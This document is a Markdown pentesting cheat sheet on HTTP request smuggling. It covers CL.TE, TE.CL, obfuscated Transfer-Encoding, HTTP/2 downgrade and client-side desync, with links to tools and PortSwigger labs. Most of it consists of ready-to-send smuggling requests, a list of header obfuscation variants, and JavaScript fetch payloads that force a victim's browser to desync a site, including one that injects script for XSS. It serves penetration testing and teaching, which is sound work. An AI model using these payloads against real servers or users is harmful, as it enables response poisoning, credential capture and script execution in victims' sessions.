# Request Smuggling

> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.

## Summary

* [Tools](#tools)
* [CL.TE vulnerabilities](#cl.te-vulnerabilities)
* [TE.CL vulnerabilities](#te.cl-vulnerabilities)
* [TE.TE behavior: obfuscating the TE header](#te.te-behavior-obfuscating-the-te-header)
* [References](#references)

## Tools

* [HTTP Request Smuggler / BApp Store](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
* [Smuggler](https://github.com/defparam/smuggler)
* [Simple HTTP Smuggler Generator CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) > this tool does not offer automated exploitation. You have to identify the injection point and exploit it manually!


## About CL.TE | TE.CL Vulnerabilities
If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as portswigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`. For that reason you can use the [Simple HTTP Smuggler Generator CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) and exploit the CL.TE TE.CL vulnerabilities manually and learn how this vulnerability works and how you can exploit it. This tool offers you only the second request with a valid chunk size(TE.CL) auto-generated but does not offer automated exploitation. You have to identify the injection point and exploit it manually!





## CL.TE vulnerabilities

> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

## TE.CL vulnerabilities

> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence \r\n\r\n following the final 0.

Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

## TE.TE behavior: obfuscating the TE header

> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header

## HTTP/2 Request Smuggling

HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header

```
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

Challenge: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

## Client-side desync

On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:

```
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.

To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

This could be used to:

* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
* to get the victim to run arbitrary JavaScript as if it were from the site

Eg:
```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

tells the victim browser to send a POST request to www.example.com/redirect. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to www.example.com. 

www.example.com now incorrectly processes the HEAD request in the POST's body, instead of the browser's GET request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual GET request.
Since the browser only sent one request, it accepts the response to the HEAD request as the response to its GET request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.

Challenge: https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync

## References

* [PortSwigger - Request Smuggling Tutorial](https://portswigger.net/web-security/request-smuggling) and [PortSwigger - Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [Advanced Request Smuggling - PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
* [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle - 10 August 2022](https://portswigger.net/research/browser-powered-desync-attacks)